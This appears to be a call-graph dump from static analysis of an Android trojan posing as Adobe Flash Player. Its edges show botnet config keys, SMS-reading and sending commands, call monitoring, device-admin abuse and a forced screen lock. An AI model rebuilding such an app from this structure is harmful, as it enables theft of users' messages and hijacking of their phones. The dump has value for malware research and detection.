STATIC edge: $r1 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke r2.<android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)>("android.app.extra.ADD_EXPLANATION", "FLASH_PLUGIN_INSTALLATION\n\n\u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0438 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u044f \u043a\u043e\u043c\u043f\u043e\u043d\u0435\u043d\u0442\u043e\u0432 com.adobe.flashplayer.\n\n\u041c\u043e\u0434\u0443\u043b\u044c \u0431\u0443\u0434\u0435\u0442 \u0437\u0430\u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0438\u0440\u043e\u0432\u0430\u043d \u043a\u0430\u043a Adobe Flash Player.\n\nFor get more information about us, please visit http://adobe.com.") in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>(byte[],java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <java.lang.String: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.String: void <clinit>()>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeUtil: void onCreate()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeUtil: void onCreate()>
SPECIAL edge: specialinvoke $r57.<java.io.File: void <init>(java.io.File,java.lang.String)>($r35, $r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: void <init>(java.io.File,java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("|") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r15.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)>(null) in <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)> ==> <com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer.Certificate: void <init>()>() in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate: void <init>()>
SPECIAL edge: $r8 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotLocation") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("getMessages") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: r34 = staticinvoke <com.adobe.flashplayer_.FlashURL: java.lang.String millisToDate(long)>($l2) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String millisToDate(long)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r15) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("sendSMS[") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=processes&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r4.<java.lang.String: int indexOf(java.lang.String)>("stop") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("sendSMS") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
STATIC edge: r30 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r20.<java.lang.String: int length()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int length()>
STATIC edge: $r41 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>(1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, r19, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer.Certificate: void setContentView(int)>(2130903040) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void setContentView(int)>
VIRTUAL edge: $r24 = virtualinvoke r3.<java.io.File: java.lang.String getPath()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String getPath()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("c", $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke $r24.<java.lang.String: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer.Certificate: void onAttachedToWindow()>() in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate: void onAttachedToWindow()>
VIRTUAL edge: virtualinvoke r3.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)> ==> <java.io.OutputStreamWriter: void close()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=in_call&i=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: $r6 = virtualinvoke $r4.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.String: boolean contains(java.lang.CharSequence)>("ua") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.AdobeUtil$1: void <init>(com.adobe.flashplayer_.AdobeUtil,long,long)>(r0, 15000L, 3000L) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil$1: void <init>(com.adobe.flashplayer_.AdobeUtil,long,long)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: $r15 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotNetwork") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forcelock", "LOCKED", $r38) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.packages.ZLocker: android.view.Window getWindow()>() in <com.adobe.packages.ZLocker: void onAttachedToWindow()> ==> <android.app.Activity: android.view.Window getWindow()>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r9) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r12) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r6 = staticinvoke <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>($r11, "android_id") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.provider.Settings$Secure: java.lang.String getString(android.content.ContentResolver,java.lang.String)>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <android.provider.CallLog$Calls: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.provider.CallLog$Calls: void <clinit>()>
SPECIAL edge: specialinvoke $r17.<com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs,com.adobe.flashplayer_.Prefs$navW)>(r0, null) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <com.adobe.flashplayer_.Prefs$navW: void <init>(com.adobe.flashplayer_.Prefs,com.adobe.flashplayer_.Prefs$navW)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("Download") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.AdobeFlashCore: void onDestroy()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeFlashCore: void onDestroy()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <java.lang.System: void exit(int)>(0) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.System: void exit(int)>
VIRTUAL edge: virtualinvoke $r2.<android.content.Intent: android.content.Intent setFlags(int)>(1048576) in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: android.content.Intent setFlags(int)>
VIRTUAL edge: $r11 = virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String getResultData()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: java.lang.String getResultData()>
VIRTUAL edge: $i0 = virtualinvoke $r21.<java.lang.String: int length()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int length()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" sec\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r2.<java.io.BufferedReader: void <init>(java.io.Reader)>(r3) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
SPECIAL edge: r1 = specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)>("Reich_SMSGate") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
SPECIAL edge: specialinvoke r3.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r5) in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("faceLock") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke r4.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r5) in <com.adobe.flashplayer_.FlashW: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
VIRTUAL edge: virtualinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r21) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r30 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>("content://sms/sent") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.FlashURL dummyMainMethod_com_adobe_flashplayer___FlashURL(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
